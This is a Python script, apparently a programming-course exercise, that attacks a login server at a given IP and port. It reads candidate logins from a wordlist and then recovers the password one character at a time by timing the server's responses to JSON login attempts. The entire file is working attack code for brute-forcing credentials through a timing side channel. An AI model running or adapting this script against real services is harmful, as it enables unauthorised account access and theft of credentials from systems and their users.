import argparse
import json
import string
from time import time

char_list = list(string.ascii_letters + string.digits + string.punctuation)


def return_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address')
    parser.add_argument('port')
    args = parser.parse_args()
    return args


def find_login(client_socket, chunk_size, path):
    with open(path, 'r') as file:
        for login in file:
            login = login.strip('\n')
            json_login = {'login': login, 'password': ''}
            char_index = 0
            guessed_password: str = ''
            time_delays = {}
            while char_index < len(char_list):
                password = guessed_password
                password += char_list[char_index]
                char_index += 1
                json_login['password'] = password
                message = json.dumps(json_login, indent=4)
                start = time()
                try:
                    client_socket.send(message.encode('utf-8'))
                    response = client_socket.recv(chunk_size).decode('utf-8')
                except:
                    pass
                end = time()
                returned_str = json.loads(response)
                diff = end - start
                time_delays[password] = diff
                if returned_str['result'] == 'Wrong login!':
                    break
                elif char_index == len(char_list):
                    sorted_dict = dict(sorted(time_delays.items(), key=lambda item: item[1]))
                    guessed_password = list(sorted_dict)[-1]
                    char_index = 0
                elif returned_str['result'] == 'Connection success!':
                    return json_login